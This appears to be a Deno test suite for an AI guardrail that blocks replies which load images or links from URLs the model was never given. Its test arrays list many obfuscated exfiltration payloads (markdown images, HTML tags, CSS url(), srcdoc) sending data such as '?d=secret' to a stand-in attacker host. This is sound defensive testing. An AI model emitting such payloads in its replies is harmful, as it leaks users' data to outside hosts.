import { assertEquals } from '@std/assert';
import { type Detection, detectAt, detectorsAt } from '../../src/guardrails/detect-at.ts';
import { type DetectSpec, detectProblem } from '../../src/guardrails/detectors.ts';
import { createEgressStream, type EgressStream } from '../../src/guardrails/egress-stream.ts';
import {
  addRequestUrls,
  addSeenUrls,
  type GivenUrls,
  givenUrlSets,
} from '../../src/guardrails/egress-urls.ts';
import { resolveGuardrailPolicy } from '../../src/guardrails/policy.ts';
import { DETECT_RULES } from '../../src/guardrails/rules.ts';
import type { ResolvedGuardrailPolicy } from '../../src/guardrails/types.ts';
import { referenceMatchStart } from './egress-reference.ts';

/** What reads a reply: a profile's detectors, and what the URL ones let through. */
type Reading = Pick<ResolvedGuardrailPolicy, 'detect' | 'allow'>;

/** A profile's `guardrails.detect`, resolved. */
function reading(detect?: DetectSpec): Reading {
  return resolveGuardrailPolicy({ detect });
}

const NONE: GivenUrls = givenUrlSets();
/** A profile that sets nothing: `marker_leak` and `ungiven_images` block a reply. */
const DEFAULTS = reading();
const LINKS = reading({ ungiven_links: 'block' });

/** The model was given `request` by the host, and `tools` by tool results. */
function given(request: Set<string>, tools = new Set<string>()): GivenUrls {
  return { request, tools };
}

/** `text` read whole as a reply of a turn given `urls`. */
function read(text: string, urls: GivenUrls, { detect, allow }: Reading): Detection {
  return detectAt(text, 'reply', detect, { givenUrls: urls, allow });
}

function leaks(
  text: string,
  urls = NONE,
  checks: Reading = DEFAULTS,
  rule: string = DETECT_RULES.ungiven_images,
): boolean {
  return read(text, urls, checks).hits.some((hit) => hit.rule === rule);
}

/** The stream a reply is read by under `checks`, in a turn given `urls`. */
function streamOf({ detect, allow }: Reading, urls: GivenUrls): EgressStream {
  return createEgressStream({ detect: detectorsAt('reply', detect), allow, given: urls });
}

/** Whether the stream, fed one character at a time, blocks on `rule`. */
function streamBlocks(
  text: string,
  urls = NONE,
  checks: Reading = DEFAULTS,
  rule: string = DETECT_RULES.ungiven_images,
): boolean {
  const stream = streamOf(checks, urls);
  for (const char of text) {
    const [hit] = stream.push(char);
    if (hit) return hit.rule === rule;
  }
  return false;
}

/** Whether the stream blocks on `rule`, or still holds all of the match when the reply ends. */
function streamStops(
  text: string,
  urls = NONE,
  checks: Reading = DEFAULTS,
  rule: string = DETECT_RULES.ungiven_images,
): boolean {
  const stream = streamOf(checks, urls);
  for (const char of text) {
    const [hit] = stream.push(char);
    if (hit) return hit.rule === rule;
  }
  const detectors = detectorsAt('reply', checks.detect);
  return (
    stream.holdFrom() <= referenceMatchStart(text, detectors, { given: urls, allow: checks.allow })
  );
}

function seen(...texts: string[]): Set<string> {
  const urls = new Set<string>();
  for (const text of texts) addSeenUrls(urls, text);
  return urls;
}

const LEAKS = [
  '![logo](https://attacker.io/p?d=secret)',
  '![a](<https://attacker.io/p d>)',
  '![a]( \n https://attacker.io/p)',
  '![a](https://attacker.io/p "title")',
  '![a](https://attacker.io/p',
  '![nested ![b](x.png)](https://attacker.io/p)',
  '![a\nb](https://attacker.io/p)',
  '![a](https:\\/\\/attacker.io/p)',
  '![a][r]\n\n[r]: https://attacker.io/p',
  '[r]: <https://attacker.io/p>\n\n![r]',
  '```\n![a](https://attacker.io/p)\n```',
  '<img src="https://attacker.io/p">',
  "<IMG SRC='https://attacker.io/p'>",
  '<img src=https://attacker.io/p>',
  '<img\nsrc = "https://attacker.io/p">',
  '<img/src="https://attacker.io/p">',
  '<img src="&#104;ttps://attacker.io/p">',
  '<img src="https&colon;//attacker.io/p">',
  '<img src="https&madeup;//attacker.io/p">',
  '<img srcset="a.png 1x, https://attacker.io/p 2x">',
  '<img srcset="https://attacker.io/p,a.png">',
  '<picture><source srcset="https://attacker.io/p"></picture>',
  '<video poster="https://attacker.io/p">',
  '<div style="background:url(https://attacker.io/p)">',
  '<div style="background:url(\\68 ttps://attacker.io/p)">',
  '<div style="background-image: image-set(\'https://attacker.io/p\' 1x)">',
  '<table background="https://attacker.io/p">',
  '<link rel="stylesheet" href="https://attacker.io/p">',
  '<svg><image href="https://attacker.io/p"/></svg>',
  '<svg><image xlink:href="https://attacker.io/p"/></svg>',
  '<iframe src="https://attacker.io/p">',
  '<iframe srcdoc="<img src=&quot;https://attacker.io/p&quot;>">',
  '<meta http-equiv="refresh" content="0;url=https://attacker.io/p">',
  '<object data="https://attacker.io/p">',
  '<img src="//attacker.io/p">',
  // An escaped opener reads as an image: the stream cannot see what came before its match.
  '\\![a](https://attacker.io/p)',
];

const PASSES = [
  'no images here',
  '[a link](https://attacker.io/p)',
  '<a href="https://attacker.io/p">link</a>',
  '![a](diagram.png)',
  '![a](/static/diagram.png)',
  '![a](data:image/png;base64,iVBORw0KGgo=)',
  '![a](https://example.com/a.png)',
  '![a](https://cdn.example.org/a.png)',
  '![a](https://site.test/a.png)',
  '![a](https://site.invalid/a.png)',
  '[r]: https://attacker.io/p',
  '<img alt="x">',
  '<img src="https://attacker.io/p"',
  'a < b and c > d',
  '<div style="color:red">',
];

Deno.test('every way a reply can load an unseen image is a leak, in the policy and the stream', () => {
  for (const text of LEAKS) {
    assertEquals([text, leaks(text)], [text, true]);
    assertEquals([text, streamStops(text)], [text, true]);
  }
});

Deno.test('links, relative and inline images, reserved hosts and plain text are not leaks', () => {
  for (const text of PASSES) {
    assertEquals([text, leaks(text)], [text, false]);
    assertEquals([text, streamBlocks(text)], [text, false]);
  }
});

Deno.test('an image the model was given this turn is not a leak', () => {
  const urls = given(seen('Search result: https://news.site/photo.jpg, via the wire.'));
  assertEquals(leaks('![photo](https://news.site/photo.jpg)', urls), false);
  assertEquals(leaks('<img src="https://NEWS.site:443/photo.jpg">', urls), false);
  assertEquals(leaks('![photo](https://news.site/photo.jpg?u=secret)', urls), true);
  assertEquals(leaks('![photo](https://news.site/other.jpg)', urls), true);
  // An image's paragraph could still grow another destination, so the stream settles it at a blank line.
  const stream = streamOf(DEFAULTS, urls);
  const passed = '![photo](https://news.site/photo.jpg)\n\nok';
  assertEquals(
    [...passed].some((char) => stream.push(char).length > 0),
    false,
  );
  assertEquals(stream.holdFrom() > passed.indexOf('\n'), true);
  assertEquals(streamBlocks('![photo](https://news.site/other.jpg)\n\nok', urls), true);
});

Deno.test('URLs are read from text the way a reader could copy them', () => {
  const urls = seen(
    '(see https://a.site/x).',
    '{"url":"https:\\/\\/b.site\\/y"}',
    '<a href="https://c.site/z?a=1&amp;b=2">',
  );
  assertEquals(urls.has('https://a.site/x'), true);
  assertEquals(urls.has('https://a.site/x).'), true);
  assertEquals(urls.has('https://b.site/y'), true);
  assertEquals(urls.has('https://c.site/z?a=1&b=2'), true);
});

Deno.test('the model is given what the request sends it, less its own earlier replies, by source', () => {
  const urls = givenUrlSets();
  addRequestUrls(urls, {
    system: 'Brand art: https://brand.site/logo.png',
    input: [{ type: 'text', text: 'what is at "https://user.site/a"\nthanks' }],
    history: [
      { role: 'assistant', content: '![x](https://attacker.io/p?d=1)' },
      {
        role: 'tool',
        tool_call_id: 't',
        name: 'fetch',
        content: '{"img":"https://tool.site/b.png"}',
      },
    ],
  });
  assertEquals([...urls.request].sort(), ['https://brand.site/logo.png', 'https://user.site/a']);
  assertEquals([...urls.tools], ['https://tool.site/b.png']);
});

/** What a profile's `detect` does with the whole of `text` as a reply. */
function replyVerdict(detect: DetectSpec | undefined, text: string, urls = NONE): string {
  return read(text, urls, reading(detect)).action;
}

Deno.test('allow.hosts lets images load from the hosts a host names, and only those', () => {
  const detect: DetectSpec = { ungiven_images: { allow: { hosts: ['cdn.acme.io'] } } };
  assertEquals(replyVerdict(detect, '![a](https://cdn.acme.io/any?q=1)'), 'allow');
  assertEquals(replyVerdict(detect, '![a](https://evil.cdn.acme.io/p)'), 'block');
  assertEquals(replyVerdict(detect, '![a](https://attacker.io/p)'), 'block');
});

Deno.test('allow takes hostnames and its own settings, and detect only the detectors there are', () => {
  const problem = (detect: unknown) => detectProblem('guardrails.detect', detect) ?? '';
  const refuses = (detect: unknown, message: string) =>
    assertEquals([detect, problem(detect).includes(message)], [detect, true]);
  for (const bad of ['https://cdn.acme.io', '.acme.io', 'cdn.acme.io/x', '']) {
    refuses({ ungiven_images: { allow: { hosts: [bad] } } }, 'which is not a hostname');
    refuses({ ungiven_links: { allow: { hosts: [bad] } } }, 'which is not a hostname');
  }
  refuses(
    { ungiven_images: { allow: { host: ['cdn.acme.io'] } } },
    'guardrails.detect.ungiven_images.allow.host is not a setting of allow',
  );
  refuses({ imageHosts: ['cdn.acme.io'] }, 'guardrails.detect.imageHosts is not a detector');
  refuses({ sensitive: 'ignore' }, 'guardrails.detect.sensitive is not a detector');
  refuses({ marker_leak: 'yes' }, 'guardrails.detect.marker_leak must be one of');
  refuses(
    { marker_leak: { allow: { hosts: ['cdn.acme.io'] } } },
    'is a setting of ungiven_images, ungiven_links and tool_leak only',
  );
  assertEquals(problem({ ungiven_links: { action: 'block', allow: { hosts: ['a.io'] } } }), '');
});

Deno.test('each detector of a reply is off when a host sets it to ignore, and only that one', () => {
  const reply = {
    marker_leak: '<user_data>',
    // Protocol-relative, as any absolute URL is a bare link too.
    ungiven_images: '<img src="//attacker.io/p?d=1">',
    ungiven_links: '[go](https://attacker.io/g?d=1)',
  };
  const on: DetectSpec = { ungiven_links: 'block' };
  for (const [detector, text] of Object.entries(reply)) {
    assertEquals([detector, replyVerdict(on, text)], [detector, 'block']);
    assertEquals(
      [detector, replyVerdict({ ...on, [detector]: 'ignore' }, text)],
      [detector, 'allow'],
    );
  }
  assertEquals(replyVerdict(undefined, reply.ungiven_links), 'allow');
  assertEquals(
    replyVerdict({ marker_leak: 'ignore', ungiven_images: 'ignore' }, reply.ungiven_images),
    'allow',
  );
});

const LINK_LEAKS = [
  '[go](https://attacker.io/g?d=secret)',
  '[go](<https://attacker.io/g d>)',
  '[go][r]\n\n[r]: https://attacker.io/g',
  '[r]: https://attacker.io/g',
  '<https://attacker.io/g?d=1>',
  'see https://attacker.io/g?d=1 now',
  'see www.attacker.io/g?d=1 now',
  'see https://seen.io"@attacker.io/g',
  '[![i](https://example.com/i.png)](https://attacker.io/c)',
  '<a href="https://attacker.io/g">x</a>',
  '<area href="https://attacker.io/g">',
  '<form action="https://attacker.io/f">',
  '<button formaction="https://attacker.io/f">',
  '<a ping="https://attacker.io/p" href="/ok">',
  '<A HREF=//attacker.io/g>',
];

const LINK_PASSES = [
  'plain text, README.md and example.com',
  '[docs](/docs/start)',
  '[docs](https://example.com/start)',
  'see https://seen.io/page.',
  '(https://seen.io/page)',
  '"https://seen.io/page"',
  '<https://seen.io/page>',
  '[seen](https://seen.io/page)',
  'mail <mailto:someone@site.test>',
  '<a name="top">',
];

Deno.test('with links on, every way a reply can link an unseen URL is a leak, in the policy and the stream', () => {
  const urls = given(seen('https://seen.io/page'));
  const link = DETECT_RULES.ungiven_links;
  for (const text of LINK_LEAKS) {
    assertEquals([text, leaks(text, urls, LINKS, link)], [text, true]);
    assertEquals([text, streamStops(text, urls, LINKS, link)], [text, true]);
  }
  for (const text of LINK_PASSES) {
    assertEquals([text, leaks(text, urls, LINKS, link)], [text, false]);
    assertEquals([text, streamBlocks(text, urls, LINKS, link)], [text, false]);
  }
});

Deno.test('with images on too, links pass an image host a host lets images load from', () => {
  const checks = reading({
    ungiven_links: 'block',
    ungiven_images: { allow: { hosts: ['cdn.acme.io'] } },
  });
  const link = DETECT_RULES.ungiven_links;
  for (const text of ['![a](https://cdn.acme.io/x.png)', '<img src="https://cdn.acme.io/x.png">']) {
    assertEquals([text, leaks(text, NONE, checks, link)], [text, false]);
    assertEquals([text, streamBlocks(text, NONE, checks, link)], [text, false]);
  }
  assertEquals(leaks('[go](https://attacker.io/g)', NONE, checks, link), true);
});

Deno.test('allow.hosts lets a reply link the hosts a host names', () => {
  const checks = reading({
    ungiven_links: { action: 'block', allow: { hosts: ['docs.acme.io'] } },
  });
  const link = DETECT_RULES.ungiven_links;
  assertEquals(leaks('[d](https://docs.acme.io/x?q=1)', NONE, checks, link), false);
  assertEquals(leaks('[d](https://attacker.io/x)', NONE, checks, link), true);
});

Deno.test('a URL a tool returned passes unless allow turns fromTools off', () => {
  const urls = given(new Set(), seen('{"url":"https://tool.site/a?d=1"}'));
  const text = '[a](https://tool.site/a?d=1) ![a](https://tool.site/a?d=1)';
  const { ungiven_links: link, ungiven_images: image } = DETECT_RULES;
  assertEquals(leaks(text, urls, LINKS, link), false);
  assertEquals(leaks(text, urls, LINKS, image), false);
  const closed = reading({
    ungiven_links: { action: 'block', allow: { fromTools: false } },
    ungiven_images: { allow: { fromTools: false } },
  });
  assertEquals(leaks(text, urls, closed, link), true);
  assertEquals(leaks(text, urls, closed, image), true);
  assertEquals(streamBlocks(text, urls, closed, link), true);
});

Deno.test('a style block loads each URL it names', () => {
  for (const text of [
    '<style>body{background:url(https://attacker.io/p)}</style>',
    '<STYLE type="text/css">@import url(https://attacker.io/p);',
    '<style>\n.a{background-image:url("https://attacker.io/p")}\n</style >ok',
  ]) {
    assertEquals([text, leaks(text)], [text, true]);
    assertEquals([text, streamStops(text)], [text, true]);
  }
  for (const text of [
    '<style>.a{color:red}</style>',
    '<styles>url(https://attacker.io/p)',
    'a <style> tag',
  ]) {
    assertEquals([text, leaks(text)], [text, false]);
    assertEquals([text, streamBlocks(text)], [text, false]);
  }
});

Deno.test('a CSS escape, comment or escaped newline does not hide a URL from the style check', () => {
  const ok = reading({ ungiven_images: { allow: { hosts: ['ok.com'] } } });
  for (const text of [
    '<style>a{background:url(https://ok.com\\)@attacker.io/p)}</style>',
    '<div style="background:url(https://ok.com\\)@attacker.io/p)">',
    '<style>/*"*/ a{background:url(https://attacker.io/p)} /*"*/</style>',
    '<style>a{background:url("https://attacker\\\n.io/p")}</style>',
  ]) {
    assertEquals([text, leaks(text, NONE, ok)], [text, true]);
    assertEquals([text, streamStops(text, NONE, ok)], [text, true]);
  }
  assertEquals(leaks('<style>a{background:url(https://ok.com/a.png)}</style>', NONE, ok), false);
});

Deno.test('a code span a renderer may not close is read as text too', () => {
  for (const text of [
    '`a\n![a](https://attacker.io/p)\n`',
    '`a\n# b ![a](https://attacker.io/p) `',
    '`a\n\n![a](https://attacker.io/p) `',
  ]) {
    assertEquals([text, leaks(text)], [text, true]);
    assertEquals([text, streamStops(text)], [text, true]);
  }
});

/** `inner` inside `depth` iframes, each document escaped into the next one's srcdoc. */
function nestedSrcdoc(inner: string, depth: number): string {
  let text = inner;
  for (let k = 0; k < depth; k++) {
    text = `<iframe srcdoc="${text.replaceAll('&', '&amp;').replaceAll('"', '&quot;')}">`;
  }
  return text;
}

Deno.test('a reply that costs more to read than its length allows is a leak as a whole', () => {
  const text = nestedSrcdoc('x'.repeat(20_000), 100);
  assertEquals(leaks(text), true);
  const stream = streamOf(DEFAULTS, NONE);
  let hit = false;
  for (let at = 0; at < text.length && !hit; at += 64)
    hit = stream.push(text.slice(at, at + 64)).length > 0;
  assertEquals(hit || stream.holdFrom() === 0, true);
  assertEquals(leaks(nestedSrcdoc('x'.repeat(20_000), 3)), false);
});

Deno.test('reading a reply takes time in proportion to its length', () => {
  const n = 64_000;
  for (const unit of [
    '[',
    '![',
    '<a ',
    '<img src="',
    '<a b=',
    '<a/b=x',
    'a<b ',
    '<style ',
    '<style>url(',
    'url(',
    '[r]: x ',
    '](',
    '[a](b ',
    '`[',
    '\n[',
    '\\[',
    'https://a.b/.',
    '<https:',
    'www.',
  ]) {
    const text = `x ${unit.repeat(Math.ceil(n / unit.length))}>`;
    const start = performance.now();
    detectAt(text, 'reply', LINKS.detect, { allow: LINKS.allow });
    const stream = createEgressStream({
      detect: detectorsAt('reply', LINKS.detect),
      allow: LINKS.allow,
    });
    for (let at = 0; at < text.length; at += 64)
      if (stream.push(text.slice(at, at + 64)).length > 0) break;
    const took = performance.now() - start;
    assertEquals([unit, took < 3000], [unit, true]);
  }
});
